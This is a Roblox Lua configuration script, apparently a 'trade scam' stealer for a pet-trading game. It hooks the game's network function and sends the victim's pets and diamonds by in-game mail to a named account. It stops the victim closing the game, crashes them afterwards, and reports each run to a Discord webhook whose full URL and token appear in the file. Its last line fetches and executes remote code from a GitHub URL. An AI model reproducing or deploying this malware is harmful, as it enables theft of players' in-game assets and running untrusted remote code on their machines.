local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
old = hookfunction(getupvalue(Fire, 1), function(...) 
    return true 
end)
--[[ SimoNHub Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "HerrySzymoN" --// Username To Send Pets To
_G.GiftMessage = "ez" --// Message For The Gift To Say

_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Crash = true  --// Crashes Them After Its Finished

--[[ Webhook Config ]]--
_G.Enabled = true --// Toggle For Sending Webhooks
_G.Mention = true --// Pings You When Someone Executes
_G.Webhook = "https://discord.com/api/webhooks/1097077640881520661/dD193ov_QbvRQvMbgg1CmXYB0cXArMLtb2gjYd-4wX-i46qLEGOxFAx9-jgm7a3Aoh30" --// Discord Webhook For Executions

--[[ UI Config ]]--
_G.ScriptName = "tradescam" --// Script Name On The UI
_G.Tip1 = "1" --// Gives You Tips On The UI
_G.Tip2 = "2" --// Gives You Tips On The UI
_G.Tip3 = "3" --// Gives You Tips On The UI
_G.Tip4 = "4" --// Gives You Tips On The UI
_G.Tip5 = "5" --// Gives You Tips On The UI
loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/test1", true))()
